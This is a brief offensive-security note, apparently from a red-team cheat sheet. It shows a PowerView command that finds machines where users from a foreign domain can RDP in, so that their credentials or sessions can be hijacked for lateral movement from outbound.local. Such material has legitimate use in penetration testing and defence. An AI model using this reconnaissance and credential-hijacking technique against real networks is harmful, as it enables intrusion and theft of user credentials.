Find where there may be an computer where foreign users can rdp to, the goal is to get their creds once on a box inside of the compromised domain

```
powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
```

Once the credentials or sessions is hijacked from a user from outbound.local, tools like PowerView can be used to enumerate the current user, domain, and possibly move laterally (permissions and open ports permitting)
